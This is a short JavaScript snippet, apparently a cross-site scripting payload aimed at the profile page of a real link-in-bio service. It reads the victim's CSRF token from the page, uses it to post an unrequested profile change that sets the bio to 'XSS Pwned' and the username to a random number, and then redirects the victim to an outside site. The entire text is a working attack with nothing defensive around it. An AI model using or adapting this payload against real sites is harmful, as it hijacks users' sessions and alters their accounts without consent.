// Changes the persons username.
alert(1)

(async () => {
    let pageHtml = await (await fetch("/page")).text();
    const username = Math.floor(Math.random() * 100);

    let token = document
        .querySelector('meta[name="csrf-token"]')
        .getAttribute("content");

    await fetch("https://solo.to/page/update-profile/1", {
        method: "POST",
        body: `_token=${token}&bio=XSS+Pwned&username=${username}`,
        headers: {
            "x-csrf-token": token,
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        },
    });
    window.location = "https://zeonight.com"
})();
